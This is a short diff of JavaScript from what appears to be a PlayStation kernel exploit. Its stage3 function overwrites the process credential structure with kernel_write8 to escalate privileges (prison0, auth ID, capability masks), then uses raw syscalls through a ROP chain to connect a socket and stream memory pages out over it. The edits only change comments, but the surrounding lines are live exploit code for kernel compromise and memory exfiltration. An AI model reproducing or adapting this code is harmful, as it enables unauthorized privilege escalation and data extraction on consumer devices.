@@ -1412,7 +1412,7 @@ function stage3() {
 
 	// Escalate sony privs
 	
-	 kernel_write8(proc_ucred.add32(0x30), prison0); // cr_sceAuthId
+	 kernel_write8(proc_ucred.add32(0x30), prison0); // cr_prison
 	 kernel_write8(proc_ucred.add32(0x58), new int64(0x00000010, 0x48000000)); // cr_sceAuthId
 	 kernel_write8(proc_ucred.add32(0x60), new int64(0xFFFFFFFF, 0xFFFFFFFF)); // cr_sceCaps[0]
 	 kernel_write8(proc_ucred.add32(0x68), new int64(0xFFFFFFFF, 0xFFFFFFFF)); // cr_sceCaps[1]
@@ -1475,7 +1475,7 @@ function stage3() {
 
   let connect_res = chain.syscall(0x062, dump_sock_fd, dump_sock_addr_store, 0x10);//connect
   alert("connected dump sock? 0x" + connect_res);
-
+  //814,78125 MiB
   for (let pfn = 0; pfn <= 0x32EC8 ; pfn++) {
       let read = chain.syscall(0x003, fd, buf, 0x1000);//read
     let write = chain.syscall(0x004, dump_sock_fd, buf, read);//write
